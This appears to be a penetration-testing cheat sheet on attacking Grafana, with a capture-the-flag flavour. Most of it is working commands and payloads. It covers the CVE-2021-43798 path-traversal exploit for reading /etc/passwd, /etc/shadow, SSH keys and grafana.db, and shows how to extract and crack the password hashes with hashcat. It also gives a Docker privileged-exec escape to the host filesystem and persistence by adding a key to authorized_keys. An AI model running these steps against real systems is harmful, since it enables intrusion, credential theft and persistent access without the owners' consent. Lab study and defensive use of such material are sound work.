# Grafana

Grafana is an open-source analytics and interactive visualization web application. It's commonly used for monitoring dashboards.

---

## Discovery

```bash
# Default port
# 3000 - HTTP

# Nmap fingerprint
nmap -sC -sV TARGET -p 3000
# http-title: Grafana
# Requested resource was /login

# Version disclosure in footer
# "Open Source v8.0.0 (41f0542c1e)"

# Check robots.txt
curl http://TARGET:3000/robots.txt
# Disallow: /
```

---

## CVE-2021-43798 - Arbitrary File Read / LFI

Directory traversal vulnerability allowing unauthenticated arbitrary file read via plugin paths.

**Affected Versions:** Grafana 8.0.0-beta1 through 8.3.0 (except patched versions)

**Reference:** https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p

### Exploitation

**POC Tools:**
- https://github.com/Jroo1053/GrafanaDirInclusion
- https://github.com/K3ysTr0K3R/CVE-2021-43798-EXPLOIT

```bash
# Using GrafanaDirInclusion
git clone https://github.com/Jroo1053/GrafanaDirInclusion.git
cd GrafanaDirInclusion

python3 exploit.py -u TARGET_IP -p 3000 -o output.txt -f "/etc/passwd"
```

### Manual Exploitation

The vulnerability exists in plugin paths. Various plugins can be used:

```bash
# Payload structure
/public/plugins/PLUGIN_NAME/../../../../../../../../../../../../FILE

# Example plugins that work:
alertlist, annolist, barchart, bargauge, candlestick, cloudwatch, 
dashlist, elasticsearch, gauge, geomap, gettingstarted, grafana, 
graph, heatmap, histogram, influxdb, jaeger, logs, loki, mssql, 
mysql, news, nodeGraph, piechart, pluginlist, postgres, prometheus, 
stackdriver, stat, state-timeline, status-history, table, 
table-old, tempo, text, timeseries, welcome, zipkin

# Read /etc/passwd
curl --path-as-is "http://TARGET:3000/public/plugins/piechart/../../../../../../../../../../../../etc/passwd"

# URL encoded version (if needed)
/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
```

### High-Value Files to Target

```bash
# Grafana config files
/etc/grafana/grafana.ini           # Main config
/etc/grafana/defaults.ini          # Default config
/conf/defaults.ini                 # Relative path
/conf/grafana.ini                  # Relative path
/usr/local/etc/grafana/grafana.ini # Alternative location

# Grafana database (contains user credentials!)
/var/lib/grafana/grafana.db

# System files
/etc/passwd
/etc/shadow                        # If readable
/home/grafana/.ssh/id_rsa
/root/.ssh/id_rsa

# Internal network info
/proc/net/fib_trie
/proc/net/tcp
/proc/self/cmdline
```

### Download Grafana Database

```bash
# Use curl with --path-as-is to prevent path normalization
curl -v --path-as-is "http://TARGET:3000/public/plugins/news/../../../../../../../../../../../../var/lib/grafana/grafana.db" --output grafana.db

# Verify it's a valid SQLite database
file grafana.db
# grafana.db: SQLite 3.x database
```

---

## Extracting Credentials from grafana.db

### Direct SQLite Query

```bash
sqlite3 grafana.db

# List tables
.tables

# Key tables:
# user - contains usernames and password hashes
# data_source - may contain database credentials
# api_key - API keys

# Dump user table
SELECT * FROM user;

# Output format:
# id|version|login|email|name|password|salt|rands|company|...
```

### User Table Schema

```
id|version|login|email|name|password|salt|rands|company|account_id|is_admin|...
```

Example output:
```
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|...
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|...
```

### Handling Corrupted Database

If sqlite3 reports "database disk image is malformed":

```bash
# Try strings to extract data
strings grafana.db | grep -A5 -B5 "password"

# Or attempt dump
sqlite3 grafana.db .dump > dump.sql
```

---

## Cracking Grafana Password Hashes

Grafana uses PBKDF2-HMAC-SHA256 with 10000 iterations.

### Using grafana2hashcat

```bash
# Tool: https://github.com/iamaldi/grafana2hashcat

git clone https://github.com/iamaldi/grafana2hashcat.git
cd grafana2hashcat

# Create input file with format: HASH,SALT
# Example:
echo "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl" > hashes.txt

# Convert to hashcat format
python3 grafana2hashcat.py hashes.txt

# Output (mode 10900 - PBKDF2-HMAC-SHA256):
# sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```

### Cracking with Hashcat

```bash
# Save converted hash to file
echo "sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=" > hashcat_hashes.txt

# Crack with rockyou
hashcat -m 10900 hashcat_hashes.txt /usr/share/wordlists/rockyou.txt

# Example cracked:
# sha256:10000:TENCaGR0SldqbA==:...:beautiful1
```

---

## Post-Exploitation

### Data Sources

Grafana often connects to databases. Check data_source table:

```sql
SELECT * FROM data_source;
-- May contain MySQL, PostgreSQL, InfluxDB credentials
```

### API Keys

```sql
SELECT * FROM api_key;
-- May have admin API keys
```

### Credential Reuse

Grafana database passwords are often reused:

```bash
# Try SSH with cracked password
ssh user@TARGET
```

---

## Grafana Running in Docker

If Grafana is running in a Docker container and you have `sudo docker exec`:

```bash
# Find container ID
ps -auxww | grep containerd-shim
# Or
docker ps

# Get container ID (first 12 chars usually sufficient)
CONTAINER_ID="e6ff5b1cbc85"

# If you can run: sudo docker exec *
# Use --privileged --user root to get full access
sudo /snap/bin/docker exec --privileged --user root -it $CONTAINER_ID /bin/sh

# Now you're root in the container
# Mount host filesystem
fdisk -l
# Find host disk (usually /dev/sda1)

mkdir /tmp/host
mount /dev/sda1 /tmp/host

# Access host filesystem as root
ls /tmp/host/root/
cat /tmp/host/root/root.txt

# Or add SSH key for persistence
echo "YOUR_SSH_KEY" >> /tmp/host/root/.ssh/authorized_keys
```

---

## Default Credentials

| Username | Password |
|----------|----------|
| admin | admin |

---

## Useful Paths

| Path | Description |
|------|-------------|
| `/var/lib/grafana/grafana.db` | SQLite database with credentials |
| `/etc/grafana/grafana.ini` | Main configuration |
| `/etc/grafana/defaults.ini` | Default configuration |
| `/var/log/grafana/` | Log files |
